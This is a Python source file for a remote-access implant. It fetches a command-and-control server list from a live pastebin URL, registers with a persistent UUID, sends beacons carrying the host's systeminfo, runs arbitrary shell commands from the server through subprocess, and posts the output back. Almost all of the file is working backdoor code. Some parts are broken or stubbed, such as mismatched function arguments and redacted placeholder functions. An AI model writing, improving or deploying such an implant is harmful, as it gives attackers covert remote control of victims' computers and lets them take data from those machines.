import requests
import subprocess
import uuid
import ast
import time
import os
import urllib3
urllib3.disable_warnings()

MainPaste = "https://pastebin.com/raw/nTUyWsNw"
### Service Handling ###
def TestServer(server):
    try:
        response = requests.get(f'{server}/ping/ping/', verify=False)
        if response.status_code == 200:
            return True
    except:
        return False

def FindAliveServer():
    server_pool=False
    try:
        server_pool = ast.literal_eval(requests.get(MainPaste, verify=False).text)    
    except:
        return False
    if server_pool:
        for server in server_pool:
            alive = TestServer(server)
            if alive:
                return server            
    return False

def BuiltInFunctionHandler(task):
    functionData =  ast.literal_eval(task['task'])
    if functionData['function'] == 'a':
        params=functionData['params']
        result = a(params)
        if result[0]:
            postResult(task, result[1])
        else:
            failedMyTask(task, result[1])
    if functionData['function'] == 'aa':
        params=functionData['params']
        result = aa(params)
        if result[0]:
            postResult(task, result[1])
        else:
            failedMyTask(task, result[1])
    if functionData['function'] == 'aaa':
        params=functionData['params']
        result = aaa(params)
        if result[0]:
            postResult(task, result[1])
        else:
            failedMyTask(task, result[1])


### ####### ######## ###

### Tasks ####
def NotifyAlive(server):
    try:
        system_info = subprocess.run('systeminfo', capture_output=True, text=True)
        requests.post(f'{server}/tasks/beacon/', json={"implant_uid":ImplantUID,'system_info':str(system_info)}, verify=False)
        return True
    except:
        return False
    
def getTask():
    try:
        task = requests.get(f'{server}/tasks/', params={'implant_uid':ImplantUID}, verify=False)
        if task.status_code == 401:
            registertoserver(server, ImplantUID)
            return False
        if len(task.json()) == 0:
            return False
        return task.json()
    except:
        return False

def postResult(task, result):
    try:
        requests.post(f'{server}/tasks/results/post/', data=
        {
            "implant_uid": ImplantUID,
            "result_task_uid":task['task_uid'],
            "result_task":task['task'],
            "result": str(result)
        }, verify=False)
        print('success posted!')
        return True
    except:
        print('failed posted!')
        return False

def failedMyTask(task, e):
    try:
        requests.post(f'{server}/tasks/failed/', json={
            'task_uid': task['task_uid'],
            'implant_uid': ImplantUID,
            'task': task['task'],
            'task_type': task['task_type'],
            'error_log': str(e),
        }, verify=False)
        return True
    except:
        return False

### Task EXEC ###
def cmdTask(task):
    try:
        result = subprocess.run(task['task'].strip(), capture_output=True, text=True)
        return True, result.stdout
    except Exception as e:
        return False, e
# Builtin
# REDACTED
def a(params):
    try:
        print(params)
        return True, params
    except Exception as e:
        return False, e
# REDACTED
def aa(params):
    try:
        print(params)
        return True, params
    except Exception as e:
        return False, e
# REDACTED
def aaa(params):
    try:
        print(params)
        return True, params
    except Exception as e:
        return False, e
### #### #### ###


### System ###
def MySystemInfo():
    try:
        MySystemInfo = subprocess.run('systeminfo', capture_output=True, text=True)
        return MySystemInfo
    except:
        return False
    
def registertoserver(server, ImplantUID):
    try:
        r= requests.post(f'{server}/tasks/register/', json={'implant_uid': ImplantUID,'implant_sysinfo': str(MySystemInfo())}, verify=False)
        if r.status_code == 200:
            return True
        return False
    except:
        return False

def uidcrap():
    ImplantUID = str(uuid.uuid4())

    def checkMyAccount(ImplantUID):
        try:
            response = requests.get(f'{server}/tasks/register/check/', params={'implant_uid':ImplantUID}, verify=False)
            if response.status_code == 200:
                return True
            else:
                return False
        except:
            return False
    try:
        path = f'{os.getcwd()}\\uid'
        if os.path.exists(path):
            with open(path, 'r') as rf:
                ImplantUID = rf.readlines()[0].strip()
            if checkMyAccount(ImplantUID):
                print('is registered')
                return ImplantUID
            else:
                print('is not registered')
                registertoserver(server, ImplantUID)
                return ImplantUID
        else:
            registertoserver(server, ImplantUID)
            with open(path, 'w') as uidwf:
                uidwf.write(ImplantUID)
            return ImplantUID
    except:
        return ImplantUID
### ##### ####

# Single action on start
server = FindAliveServer()
ImplantUID = uidcrap()

# Repeated Proccesses
task = getTask()
if task:
    if task['task_type'] == "CMD":
        result = cmdTask(task)
        if result[0]:
            postResult(server, task, result[1])
        else:
            failedMyTask(server,task,result[1])
    elif task['task_type'] == "BuiltIn":
        BuiltInFunctionHandler(task)
    elif task['task_type'] == "WriteScript":
        print('Write Script')
else:
    print('no task or unknown type!')
